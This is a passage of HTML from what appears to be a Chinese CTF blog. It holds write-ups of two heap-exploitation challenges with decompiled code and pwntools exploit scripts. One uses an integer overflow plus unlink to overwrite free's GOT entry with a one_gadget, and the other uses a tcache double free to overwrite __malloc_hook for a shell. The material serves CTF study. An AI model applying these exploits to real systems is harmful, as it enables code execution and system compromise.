class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heapidx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = *(&amp;heaplist + v2);</span><br><span class="line">      v5 = chunk_size[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = <span class="built_in">input</span>();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">          v7 = <span class="built_in">malloc</span>(<span class="number">0xA0uLL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v7, <span class="string">&quot;TheNewContents:&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(v7);</span><br><span class="line">          <span class="built_in">input1</span>(v7 + <span class="number">15</span>, <span class="string">&#x27;\x90&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="built_in">sub_400B10</span>(v7 + <span class="number">15</span>);</span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[v5 - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Edit note success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Error choice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;note has been deleted&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please add a note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>对free的指针进行了清零的操作，uaf和double free无法使用了</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;heaplist + v2));</span><br><span class="line">      *(&amp;heaplist + v2) = <span class="number">0LL</span>;</span><br><span class="line">      chunk_size[v2] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;delete note success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="核心漏洞点-整数溢出"><a href="#核心漏洞点-整数溢出" class="headerlink" title="核心漏洞点-整数溢出"></a>核心漏洞点-整数溢出</h2><ul><li>在add函数的input1函数中，存在难发现的整数溢出漏洞</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925195730160.bmp"></p><ul><li><font size="red">定义的i是一个无符号整型，但是a2(size)确是一个有符号整形，因此有整数溢出</font></li><li>对于无符号与有符号的比较，会将<strong>有符号转化为无符号</strong>，所以若我们给a2赋值为0，a2 -1&#x3D;-1,对应于无符号整型是最大的数字，那么我们就可以任意写了。</li></ul><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h2><ul><li>题目没有开启PIE，自然想到了unlink，由于edit中会malloc(0xa0)的chunk，我们构造出一个0xa0的free_chunk，在edit的时候就相当于是覆写了，借助这个0xa0的chunk还可以进行unlink:</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于不能edit直接改，所以</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br></pre></td></tr></table></figure></div><ul><li>0xa0 &#x3D; 0x80 + 0x20（0x80是因为我们构造unlink的fake_chunk是从user_data开始构造，此处相当于overlapping chunk0,chunk1）</li><li>正常应该是溢出修改chunk2的prev_size为0xa0,以及size的inuse&#x3D;0，但是我们没有off_by_one，也无法直接溢出改，于是，我们利用add里面的整数溢出进行改写</li><li>free(chunk1)，只要将size赋值为0，就可以溢出改写了，效果如下：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925201946698.bmp"></p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><ul><li>接下来直接free相邻chunk，即chunk2，就可以达到unlink的效果</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925202348973.bmp"></p><ul><li>此时就是正常的unlink的利用，如下：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br></pre></td></tr></table></figure></div><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ul><li>在分析edit函数的时候就说了，会在最后执行一次free，所以直接edit chunk0为Onegadget相当于修改free_got 为onegadget,并且在最后会执行free，即onegadget,getshell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改free_got 为 onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># edit改完会执行free</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27639)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2.append]&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以打unlink</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#name</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于不能edit直接改，所以</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改free_got 为 onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># edit改完会执行free</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_double_free_overlap</title>
      <link href="/2024/09/23/tcache-double-free-overlap/"/>
      <url>/2024/09/23/tcache-double-free-overlap/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_final_3">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>overlap</strong>：<a class="link" href="https://blog.csdn.net/qq_41202237/article/details/108320408">参考文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>题解参考文章：</strong><a class="link" href="https://blog.csdn.net/mcmuyanga/article/details/113995633">参考题解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><ul><li>main函数只有add和free可以使用</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit();</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to babyheap&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;choice &gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li><strong>核心就位于画红框的地方，相当于show了。</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/tcache-double-free-overlap/capture_20240923192321767.bmp"></p><h2 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h2><p><img lazyload src="/images/loading.svg" data-src="/tcache-double-free-overlap/capture_20240923192541167.bmp"></p><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><ul><li>泄露libc是必不可少的，该题目有tcache，要free掉0x410以上的chunk才可以进入到unsorted bin 中，但是此题目规定了只能size只能&lt;&#x3D;0x78，于是我们想到了overlapping修改size</li><li>关于overlapping可以看开头的文章，修改完size，free即可获得main_arena+96地址，得到libc，获得onegadget</li><li>double free 改malloc hook为onegadget,再次malloc即可，相当于调用onegadget</li></ul><h1 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h1><h2 id="overlapping-泄露libc"><a href="#overlapping-泄露libc" class="headerlink" title="overlapping+泄露libc"></a>overlapping+泄露libc</h2><ul><li><strong>想要overlapping,得先构造出0x421的chunk出来，一开始没有构造，后面再次malloc的chunk其实是在这个free_chunk里面的，再次free会报错。</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"><span class="comment"># 以上是构造出0x421的chunk</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free修改size</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 此时 tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># 修改size为0x421</span></span><br></pre></td></tr></table></figure></div><ul><li>这里也不是很懂，不知道为什么中间会插一步tcache，以后再填上</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin 此时chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># 切割unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br></pre></td></tr></table></figure></div><h2 id="double-free-修改malloc-hook"><a href="#double-free-修改malloc-hook" class="headerlink" title="double free 修改malloc_hook"></a>double free 修改malloc_hook</h2><ul><li>修改malloc_hook为onegadget，然后再次malloc就可以getshell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" 